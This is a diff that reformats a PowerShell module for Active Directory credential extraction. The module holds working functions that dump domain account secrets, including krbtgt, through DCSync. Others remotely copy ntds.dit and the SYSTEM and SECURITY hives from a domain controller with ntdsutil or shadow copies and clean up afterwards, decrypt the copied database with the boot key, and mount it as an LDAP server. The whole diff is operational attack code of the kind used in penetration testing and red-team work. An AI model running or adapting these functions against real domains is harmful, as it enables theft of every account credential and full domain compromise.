@@ -29,70 +29,76 @@ function Invoke-DCSync {
 .EXAMPLE
     PS C:\> Invoke-DCSync -Server DC.ADATUM.CORP -Credential ADATUM\Administrator -SamAccountName krbtgt
 #>
-	Param (
-		[ValidateNotNullOrEmpty()]
-		[String]
-		$Server = $env:LOGONSERVER,
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Server = $env:LOGONSERVER,
 
-		[ValidateNotNullOrEmpty()]
-		[System.Management.Automation.PSCredential]
-		[System.Management.Automation.Credential()]
-		$Credential = [System.Management.Automation.PSCredential]::Empty,
+        [ValidateNotNullOrEmpty()]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]
+        $Credential = [System.Management.Automation.PSCredential]::Empty,
 
-		[ValidateNotNullOrEmpty()]
-		[String]
-		$SamAccountName
-	)
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $SamAccountName
+    )
 
-	# Check if DSInternals module is installed
-	If(-Not(Get-Module -Name DSInternals -ListAvailable)) {
-		Write-Warning "This command must be launched on a computer with DSInternals PowerShell module installed."
-		Write-Warning "Please run command 'Install-Module -Name DSInternals' first"
-		Exit 1
-	} Else {
-		Import-Module DSInternals
-	}
+    # Check if DSInternals module is installed
+    if (-Not(Get-Module -Name DSInternals -ListAvailable)) {
+        Write-Warning "This command must be launched on a computer with DSInternals PowerShell module installed."
+        Write-Warning "Please run command 'Install-Module -Name DSInternals' first"
+        return
+    }
+    else {
+        Import-Module DSInternals
+    }
 
-	# Retrieve base DN
-	$BaseURI = "LDAP://" + $Server
-	$SearchString = $BaseURI + "/RootDSE"
-	If ($Credential.UserName) {
-		$DomainObject = New-Object System.DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
-	} Else {
-		$DomainObject = New-Object System.DirectoryServices.DirectoryEntry($SearchString)
-	}
-	$BaseDN = $DomainObject.defaultNamingContext
+    # Retrieve base DN
+    $BaseURI = "LDAP://" + $Server
+    $SearchString = $BaseURI + "/RootDSE"
+    if ($Credential.UserName) {
+        $DomainObject = New-Object System.DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
+    }
+    else {
+        $DomainObject = New-Object System.DirectoryServices.DirectoryEntry($SearchString)
+    }
+    $BaseDN = $DomainObject.defaultNamingContext
 
-	If ($SamAccountName) {
-		# Retrieve NetBIOS name 
-		$SearchString = $BaseURI + "/" + "cn=Partitions," + $DomainObject.configurationNamingContext
-		If ($Credential.UserName) {
-			$DomainObject = New-Object System.DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
-			$Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
-		} Else {
-			$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
-		}
-		$Searcher.Filter = "(&(objectCategory=crossRef)(ncName=" + $BaseDN + "))"
-		$Searcher.SearchScope = "OneLevel";
-		$Null = $Searcher.PropertiesToLoad.Add("nETBIOSName")
-		$Results = $Searcher.FindAll()
-		$NetbiosName = $Results[0].Properties["nETBIOSName"]
-		$Results.dispose()
-		$Searcher.dispose()
-		# Dump a specific domain account
-		If ($Credential.UserName) {
-			Get-ADReplAccount -SamAccountName "$SamAccountName" -Server "$Server" -Domain $NetbiosName -Credential $Credential
-		} Else {
-			Get-ADReplAccount -SamAccountName "$SamAccountName" -Server "$Server" -Domain $NetbiosName
-		}
-	} Else {
-		# Dump all domain accounts
-		If ($Credential.UserName) {
-			Get-ADReplAccount -All -NamingContext "$BaseDN" -Server "$Server" -Credential $Credential
-		} Else {
-			Get-ADReplAccount -All -NamingContext "$BaseDN" -Server "$Server"
-		}
-	}
+    if ($SamAccountName) {
+        # Retrieve NetBIOS name 
+        $SearchString = $BaseURI + "/" + "cn=Partitions," + $DomainObject.configurationNamingContext
+        if ($Credential.UserName) {
+            $DomainObject = New-Object System.DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
+            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
+        }
+        else {
+            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+        }
+        $Searcher.Filter = "(&(objectCategory=crossRef)(ncName=" + $BaseDN + "))"
+        $Searcher.SearchScope = "OneLevel";
+        $null = $Searcher.PropertiesToLoad.Add("nETBIOSName")
+        $Results = $Searcher.FindAll()
+        $NetbiosName = $Results[0].Properties["nETBIOSName"]
+        $Results.dispose()
+        $Searcher.dispose()
+        # Dump a specific domain account
+        if ($Credential.UserName) {
+            Get-ADReplAccount -SamAccountName "$SamAccountName" -Server "$Server" -Domain $NetbiosName -Credential $Credential
+        }
+        else {
+            Get-ADReplAccount -SamAccountName "$SamAccountName" -Server "$Server" -Domain $NetbiosName
+        }
+    }
+    else {
+        # Dump all domain accounts
+        if ($Credential.UserName) {
+            Get-ADReplAccount -All -NamingContext "$BaseDN" -Server "$Server" -Credential $Credential
+        }
+        else {
+            Get-ADReplAccount -All -NamingContext "$BaseDN" -Server "$Server"
+        }
+    }
 }
 
 function Get-ADDatabase {
@@ -121,86 +127,89 @@ function Get-ADDatabase {
 .EXAMPLE
     PS C:\> Get-ADDatabase -Server DC.ADATUM.CORP -TargetDirectory C:\Windows\Temp -Credential ADATUM\Administrator
 #>
-	Param (
-		[ValidateNotNullOrEmpty()]
-		[String]
-		$Server = $env:LOGONSERVER,
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Server = $env:LOGONSERVER,
 
-		[ValidateNotNullOrEmpty()]
-		[String]
-		$TargetDirectory = ".",
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $TargetDirectory = ".",
 
-		[ValidateNotNullOrEmpty()]
-		[System.Management.Automation.PSCredential]
-		[System.Management.Automation.Credential()]
-		$Credential = [System.Management.Automation.PSCredential]::Empty
-	)
+        [ValidateNotNullOrEmpty()]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]
+        $Credential = [System.Management.Automation.PSCredential]::Empty
+    )
 
-	# Identify the operating system version
-	Write-Host "[*] Identifying the operating system version of $Server"
-	Try {
-		$OS = Get-WmiObject Win32_OperatingSystem -ComputerName $Server -Credential $Credential
-	} Catch {
-		Write-Warning $_
-		Exit 1
-	}
+    # Identify the operating system version
+    Write-Host "[*] Identifying the operating system version of $Server"
+    try {
+        $OS = Get-WmiObject Win32_OperatingSystem -ComputerName $Server -Credential $Credential
+    }
+    catch {
+        Write-Warning $_
+        return
+    }
 
-	# Map a drive to the domain controller and create a temporary directory
-	New-PSDrive -Name "S" -Root "\\$Server\c$" -Credential $Credential -PSProvider "FileSystem" | Out-Null
-	New-Item -Path 'S:\Windows\Temp\dump' -ItemType directory | Out-Null
+    # Map a drive to the domain controller and create a temporary directory
+    New-PSDrive -Name "S" -Root "\\$Server\c$" -Credential $Credential -PSProvider "FileSystem" | Out-Null
+    New-Item -Path 'S:\Windows\Temp\dump' -ItemType directory | Out-Null
 
-	# If the operating system is Windows 2008 or later
-	If ($OS.Version[0] -ge 6) {
-		Write-Host "[*] Creating NTDS copy using ntdsutil"
-		$Process = Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList 'cmd.exe /c ntdsutil "ac in ntds" i "cr fu C:\Windows\Temp\dump" q q' -ComputerName $Server -Credential $Credential
-		Do {
-			Start-Sleep -m 250
-		} Until ((Get-WmiObject -Class Win32_process -Filter "ProcessId='$($Process.ProcessId)'" -ComputerName $Server -Credential $Credential | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
+    # If the operating system is Windows 2008 or later
+    if ($OS.Version[0] -ge 6) {
+        Write-Host "[*] Creating NTDS copy using ntdsutil"
+        $Process = Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList 'cmd.exe /c ntdsutil "ac in ntds" i "cr fu C:\Windows\Temp\dump" q q' -ComputerName $Server -Credential $Credential
+        do {
+            Start-Sleep -m 250
+        }
+        until ((Get-WmiObject -Class Win32_process -Filter "ProcessId='$($Process.ProcessId)'" -ComputerName $Server -Credential $Credential | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
 
-		# Copy the ntds.dit file and registry hives locally
-		Write-Host "[*] Copying the NTDS file and registry hives into $(Resolve-Path $TargetDirectory)"
-		Copy-Item 'S:\Windows\Temp\dump\Active Directory\ntds.dit' $TargetDirectory
-		Copy-Item 'S:\Windows\Temp\dump\registry\SECURITY' $TargetDirectory
-		Copy-Item 'S:\Windows\Temp\dump\registry\SYSTEM' $TargetDirectory
-	}
+        # Copy the ntds.dit file and registry hives locally
+        Write-Host "[*] Copying the NTDS file and registry hives into $(Resolve-Path $TargetDirectory)"
+        Copy-Item 'S:\Windows\Temp\dump\Active Directory\ntds.dit' $TargetDirectory
+        Copy-Item 'S:\Windows\Temp\dump\registry\SECURITY' $TargetDirectory
+        Copy-Item 'S:\Windows\Temp\dump\registry\SYSTEM' $TargetDirectory
+    }
 
-	# If the operating system is Windows 2003
-	Else {
-		# Grab the location of the ntds.dit file on the remote domain controller
-		$Hive = [uint32]2147483650
-		$Key = "SYSTEM\\CurrentControlSet\\Services\\NTDS\Parameters"
-		$Value = "DSA Database File"
-		$DitPath = (Invoke-WmiMethod -Class StdRegProv -Name GetStringValue -ArgumentList $Hive, $Key, $Value -ComputerName $Server -Credential $Credential).sValue
-		$DitDrive = $DitPath.Split("\")[0]
-		$DitRelativePath = $DitPath.Split("\")[1..($DitPath.Split("\").Length - 2)] -Join "\"
+    # If the operating system is Windows 2003
+    else {
+        # Grab the location of the ntds.dit file on the remote domain controller
+        $Hive = [uint32]2147483650
+        $Key = "SYSTEM\\CurrentControlSet\\Services\\NTDS\Parameters"
+        $Value = "DSA Database File"
+        $DitPath = (Invoke-WmiMethod -Class StdRegProv -Name GetStringValue -ArgumentList $Hive, $Key, $Value -ComputerName $Server -Credential $Credential).sValue
+        $DitDrive = $DitPath.Split("\")[0]
+        $DitRelativePath = $DitPath.Split("\")[1..($DitPath.Split("\").Length - 2)] -Join "\"
 
-		# Create a shadow copy of the corresponding drive
-		Write-Host "[*] Creating a shadow copy"
-		$Process = Invoke-WmiMethod -Class Win32_ShadowCopy -Name Create -ArgumentList 'ClientAccessible',"$DitDrive\" -ComputerName $Server -Credential $Credential
-		$ShadowCopy = Get-WmiObject -Class Win32_ShadowCopy -Property DeviceObject -Filter "ID = '$($Process.ShadowID)'" -ComputerName $Server -Credential $Credential
-		$DeviceObject = $ShadowCopy.DeviceObject.ToString()
+        # Create a shadow copy of the corresponding drive
+        Write-Host "[*] Creating a shadow copy"
+        $Process = Invoke-WmiMethod -Class Win32_ShadowCopy -Name Create -ArgumentList 'ClientAccessible',"$DitDrive\" -ComputerName $Server -Credential $Credential
+        $ShadowCopy = Get-WmiObject -Class Win32_ShadowCopy -Property DeviceObject -Filter "ID = '$($Process.ShadowID)'" -ComputerName $Server -Credential $Credential
+        $DeviceObject = $ShadowCopy.DeviceObject.ToString()
 
-		# Copy the ntds.dit file and SYSTEM hive from the shadow copy
-		$Process = Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList "cmd.exe /c for %I in ($DeviceObject\$DitRelativePath\ntds.dit $DeviceObject\$DitRelativePath\edb.log $DeviceObject\Windows\System32\config\SYSTEM $DeviceObject\Windows\System32\config\SECURITY) do copy %I C:\Windows\Temp\dump" -ComputerName $Server -Credential $Credential
-		Do {
-			Start-Sleep -m 250
-		} Until ((Get-WmiObject -Class Win32_process -Filter "ProcessId='$($Process.ProcessId)'" -ComputerName $Server -Credential $Credential | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
+        # Copy the ntds.dit file and SYSTEM hive from the shadow copy
+        $Process = Invoke-WmiMethod -Class Win32_Process -Name create -ArgumentList "cmd.exe /c for %I in ($DeviceObject\$DitRelativePath\ntds.dit $DeviceObject\$DitRelativePath\edb.log $DeviceObject\Windows\System32\config\SYSTEM $DeviceObject\Windows\System32\config\SECURITY) do copy %I C:\Windows\Temp\dump" -ComputerName $Server -Credential $Credential
+        do {
+            Start-Sleep -m 250
+        }
+        until ((Get-WmiObject -Class Win32_process -Filter "ProcessId='$($Process.ProcessId)'" -ComputerName $Server -Credential $Credential | Where {$_.Name -eq "cmd.exe"}).ProcessID -eq $null)
 
-		# Delete the shadow copy
-		(Get-WmiObject -Namespace root\cimv2 -Class Win32_ShadowCopy -ComputerName $Server -Credential $Credential | Where-Object {$_.DeviceObject -eq $DeviceObject}).Delete()
+        # Delete the shadow copy
+        (Get-WmiObject -Namespace root\cimv2 -Class Win32_ShadowCopy -ComputerName $Server -Credential $Credential | Where-Object {$_.DeviceObject -eq $DeviceObject}).Delete()
 
-		# Copy the ntds.dit file and registry hives locally
-		Write-Host "[*] Copying the NTDS file and registry hives into $(Resolve-Path $TargetDirectory)"
-		Copy-Item 'S:\Windows\Temp\dump\ntds.dit' $TargetDirectory
-		Copy-Item 'S:\Windows\Temp\dump\edb.log' $TargetDirectory
-		Copy-Item 'S:\Windows\Temp\dump\SYSTEM' $TargetDirectory
-		Copy-Item 'S:\Windows\Temp\dump\SECURITY' $TargetDirectory
-	}
+        # Copy the ntds.dit file and registry hives locally
+        Write-Host "[*] Copying the NTDS file and registry hives into $(Resolve-Path $TargetDirectory)"
+        Copy-Item 'S:\Windows\Temp\dump\ntds.dit' $TargetDirectory
+        Copy-Item 'S:\Windows\Temp\dump\edb.log' $TargetDirectory
+        Copy-Item 'S:\Windows\Temp\dump\SYSTEM' $TargetDirectory
+        Copy-Item 'S:\Windows\Temp\dump\SECURITY' $TargetDirectory
+    }
 
-	# Delete the temporary directory
-	Write-Host "[*] Cleaning up remote temporary files"
-	Remove-Item 'S:\Windows\Temp\dump' -Recurse
-	Remove-PSDrive S
+    # Delete the temporary directory
+    Write-Host "[*] Cleaning up remote temporary files"
+    Remove-Item 'S:\Windows\Temp\dump' -Recurse
+    Remove-PSDrive S
 }
 
 function Dump-ADDatabase {
@@ -234,45 +243,47 @@ function Dump-ADDatabase {
 .EXAMPLE
     PS C:\> Dump-ADDatabase -DatabasePath C:\Windows\Temp\ntds.dit -SystemHiveFilePath C:\Windows\Temp\SYSTEM -SamAccountName krbtgt
 #>
-	Param (
-		[ValidateNotNullOrEmpty()]
-		[String]
-		$DatabasePath = ".\ntds.dit",
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $DatabasePath = ".\ntds.dit",
 
-		[ValidateNotNullOrEmpty()]
-		[String]
-		$SystemHiveFilePath = ".\SYSTEM",
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $SystemHiveFilePath = ".\SYSTEM",
 
-		[ValidateNotNullOrEmpty()]
-		[String]
-		$SamAccountName
-	)
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $SamAccountName
+    )
 
-	# Check if DSInternals module is installed
-	If(-Not(Get-Module -Name DSInternals -ListAvailable)) {
-		Write-Warning "This command must be launched on a computer with DSInternals PowerShell module installed."
-		Write-Warning "Please run command 'Install-Module -Name DSInternals' first"
-		Exit 1
-	} Else {
-		Import-Module DSInternals
-	}
-
-	# Check if user is elevated
-	$currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
-	If($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
-		Write-Warning "This command must be launched as an Administrator" 
-		Exit 1
+    # Check if DSInternals module is installed
+    if (-Not(Get-Module -Name DSInternals -ListAvailable)) {
+        Write-Warning "This command must be launched on a computer with DSInternals PowerShell module installed."
+        Write-Warning "Please run command 'Install-Module -Name DSInternals' first"
+        return
+    }
+    else {
+        Import-Module DSInternals
     }
 
-	# Read the Boot Key from the SYSTEM registry hive
-	$key = Get-BootKey -SystemHiveFilePath "$SystemHiveFilePath"
+    # Check if user is elevated
+    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
+    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
+        Write-Warning "This command must be launched as an Administrator" 
+        return
+    }
 
-	# Read one or more accounts from the ntds.dit file
-	If ($SamAccountName) {
-		Get-ADDBAccount -SamAccountName "$SamAccountName" -DatabasePath "$DatabasePath" -BootKey $key
-	} Else {
-		Get-ADDBAccount -All -DatabasePath "$DatabasePath" -BootKey $key
-	}
+    # Read the Boot Key from the SYSTEM registry hive
+    $key = Get-BootKey -SystemHiveFilePath "$SystemHiveFilePath"
+
+    # Read one or more accounts from the ntds.dit file
+    if ($SamAccountName) {
+        Get-ADDBAccount -SamAccountName "$SamAccountName" -DatabasePath "$DatabasePath" -BootKey $key
+    }
+    else {
+        Get-ADDBAccount -All -DatabasePath "$DatabasePath" -BootKey $key
+    }
 }
 
 function Mount-ADDatabase {
@@ -309,53 +320,56 @@ function Mount-ADDatabase {
 .EXAMPLE
     PS C:\> Mount-ADDatabase -DatabasePath C:\Windows\Temp\ntds.dit -AllowUpgrade -LdapPort 1389
 #>
-	Param (
-		[ValidateNotNullOrEmpty()]
-		[String]
-		$DatabasePath = ".\ntds.dit",
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $DatabasePath = ".\ntds.dit",
 
-		[switch]
-		$AllowUpgrade = $false,
+        [switch]
+        $AllowUpgrade = $false,
 
-		[ValidateRange(1025,65535)]
-		[int]
-		$LdapPort = 3266
-	)
+        [ValidateRange(1025,65535)]
+        [int]
+        $LdapPort = 3266
+    )
 
-	# Check if dsamain.exe is in the PATH
-	If ((Get-Command dsamain.exe -ErrorAction SilentlyContinue) -eq $null) {
-		Write-Warning "This command must be launched on a computer with AD LDS installed"
-		Exit 1
-	}
+    # Check if dsamain.exe is in the PATH
+    if ((Get-Command dsamain.exe -ErrorAction SilentlyContinue) -eq $null) {
+        Write-Warning "This command must be launched on a computer with AD LDS installed"
+        return
+    }
 
-	# Check if user is elevated
-	$currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
-	If($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
-		Write-Warning "This command must be launched as an Administrator" 
-		Exit 1
-        }
+    # Check if user is elevated
+    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
+    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
+        Write-Warning "This command must be launched as an Administrator" 
+        return
+    }
 
-	Write-Host "[*] Mounting NTDS database as a LDAP server"
-	If ($AllowUpgrade) {
-		$Options = '-allowNonAdminAccess -allowUpgrade'
-	} Else {
-		$Options = '-allowNonAdminAccess'
-	}
-	$DSAMain = Start-Process -FilePath dsamain.exe -ArgumentList "-dbpath $DatabasePath -ldapPort $LdapPort $Options" -PassThru -WindowStyle 1
-	Start-Sleep -Seconds 3
-	If (-Not(Get-Process dsamain -ErrorAction SilentlyContinue)) {
-		Write-Warning "An error occured, retry with another port for LDAP server. If the error persist, please try the option 'AllowUpgrade' after backing up the database file"
-	} ElseIf (-Not((Test-NetConnection -ComputerName localhost -Port $LdapPort -ErrorAction SilentlyContinue).TcpTestSucceeded)) {
-		Write-Warning "An error occured, retry with option 'AllowUpgrade' after backing up the database file"
-		Umount-ADDatabase
-	} Else {
-		Write-Host "[*] LDAP server listening on port $LdapPort"
-		Write-Host "[!] Run command 'Umount-ADDatabase' to stop"
-	}
+    Write-Host "[*] Mounting NTDS database as a LDAP server"
+    if ($AllowUpgrade) {
+        $Options = '-allowNonAdminAccess -allowUpgrade'
+    }
+    else {
+        $Options = '-allowNonAdminAccess'
+    }
+    $DSAMain = Start-Process -FilePath dsamain.exe -ArgumentList "-dbpath $DatabasePath -ldapPort $LdapPort $Options" -PassThru -WindowStyle 1
+    Start-Sleep -Seconds 3
+    if (-Not(Get-Process dsamain -ErrorAction SilentlyContinue)) {
+        Write-Warning "An error occured, retry with another port for LDAP server. If the error persist, please try the option 'AllowUpgrade' after backing up the database file"
+    }
+    elseif (-Not((Test-NetConnection -ComputerName localhost -Port $LdapPort -ErrorAction SilentlyContinue).TcpTestSucceeded)) {
+        Write-Warning "An error occured, retry with option 'AllowUpgrade' after backing up the database file"
+        Umount-ADDatabase
+    }
+    else {
+        Write-Host "[*] LDAP server listening on port $LdapPort"
+        Write-Host "[!] Run command 'Umount-ADDatabase' to stop"
+    }
 }
 
 function Umount-ADDatabase {
-	Get-Process dsamain -ErrorAction SilentlyContinue | Stop-Process
+    Get-Process dsamain -ErrorAction SilentlyContinue | Stop-Process
 }
 
 function Invoke-LdapSearch {
@@ -385,51 +399,54 @@ function Invoke-LdapSearch {
 .EXAMPLE
     PS C:\> Invoke-LdapSearch -Server localhost:1389 -LdapFilter "(objectClass=person)" -Properties sAMAccountName
 #>
-	Param (
-		[ValidateNotNullOrEmpty()]
-		[String]
-		$Server = "localhost:3266",
+    Param (
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Server = "localhost:3266",
 
         [switch]
         $Configuration,
 
-		[ValidateNotNullOrEmpty()]
-		[String]
-		$LdapFilter = "(objectClass=user)",
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $LdapFilter = "(objectClass=user)",
 
-		[ValidateNotNullOrEmpty()]
-		[String[]]
-		$Properties = "*"
-	)
+        [ValidateNotNullOrEmpty()]
+        [String[]]
+        $Properties = "*"
+    )
 
-	$BaseURI = "LDAP://" + $Server
-	$BaseDN = (New-Object System.DirectoryServices.DirectoryEntry($BaseURI + "/RootDSE")).defaultNamingContext
-	If ($Configuration) {
-		$SearchString = $SearchString = $BaseURI + "/" + "CN=Configuration," + $BaseDN
-	} Else {
-		$SearchString = $SearchString = $BaseURI + "/" + $BaseDN
-	}
-	$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
-	$Searcher.Filter = $LdapFilter
-	$PropertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
-	$Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
-	Try {
-		$Results = $Searcher.FindAll()
-		$Results | Where-Object {$_} | ForEach-Object {
-			$ObjectProperties = @{}
-			$p = $_.Properties
-			$p.PropertyNames | ForEach-Object {
-				If (($_ -ne 'adspath') -And ($p[$_].count -eq 1)) {
-					$ObjectProperties[$_] = $p[$_][0]
-				} ElseIf ($_ -ne 'adspath') {
-					$ObjectProperties[$_] = $p[$_]
-				}
-			}
-			New-Object -TypeName PSObject -Property ($ObjectProperties)
-		}
-		$Results.dispose()
-		$Searcher.dispose()
-	} Catch {
-		Write-Warning "$_"
-	}
+    $BaseURI = "LDAP://" + $Server
+    $BaseDN = (New-Object System.DirectoryServices.DirectoryEntry($BaseURI + "/RootDSE")).defaultNamingContext
+    if ($Configuration) {
+        $SearchString = $SearchString = $BaseURI + "/" + "CN=Configuration," + $BaseDN
+    }
+    else {
+        $SearchString = $SearchString = $BaseURI + "/" + $BaseDN
+    }
+    $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+    $Searcher.Filter = $LdapFilter
+    $PropertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
+    $null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
+    try {
+        $Results = $Searcher.FindAll()
+        $Results | Where-Object {$_} | ForEach-Object {
+            $ObjectProperties = @{}
+            $p = $_.Properties
+            $p.PropertyNames | ForEach-Object {
+                if (($_ -ne 'adspath') -And ($p[$_].count -eq 1)) {
+                    $ObjectProperties[$_] = $p[$_][0]
+                }
+                elseif ($_ -ne 'adspath') {
+                    $ObjectProperties[$_] = $p[$_]
+                }
+            }
+            New-Object -TypeName PSObject -Property ($ObjectProperties)
+        }
+        $Results.dispose()
+        $Searcher.dispose()
+    }
+    catch {
+        Write-Warning "$_"
+    }
 }
